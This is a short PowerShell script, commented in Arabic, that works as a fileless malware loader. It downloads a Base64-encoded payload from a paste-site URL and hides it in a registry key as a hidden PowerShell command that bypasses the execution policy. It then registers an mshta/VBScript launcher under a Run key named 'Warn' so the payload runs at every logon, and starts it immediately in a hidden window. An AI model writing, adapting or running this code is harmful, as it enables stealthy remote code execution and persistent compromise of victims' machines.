# رابط السلسلة المشفرة بتنسيق Base64 (استبدل بالرابط الفعلي)
$base64Url = "https://dpaste.com/A2H8VUVWG.txt"

# تحميل السلسلة المشفرة من الرابط
$base64EncodedCommand = Invoke-RestMethod -Uri $base64Url

# إنشاء مفتاح تسجيل لحفظ السلسلة المشفرة
$regPath = "HKCU:\v1MOHIBF"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "powershell.exe -ep bypass -w hidden -e $base64EncodedCommand"

# إنشاء سلسلة لتنفيذ السلسلة المشفرة من التسجيل باستخدام MSHTA
$mshtaCommand = 'MSHTA VbScript:Execute("CreateObject(""Wscript.Shell"").Run CreateObject(""Wscript.Shell"").RegRead(""HKCU:\\v1MOHIBF""), 0, False:close")'

# إعداد السجل لتشغيل السلسلة عند بدء التشغيل
$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# التحقق من وجود الخاصية وتحديثها أو إنشائها عند الضرورة
if (Get-ItemProperty -Path $runKeyPath -Name "Warn" -ErrorAction SilentlyContinue) {
    Set-ItemProperty -Path $runKeyPath -Name "Warn" -Value $mshtaCommand
} else {
    New-ItemProperty -Path $runKeyPath -Name "Warn" -Value $mshtaCommand
}

# تشغيل السلسلة فورًا باستخدام mshta.exe
Start-Process "mshta.exe" -ArgumentList $mshtaCommand -WindowStyle Hidden
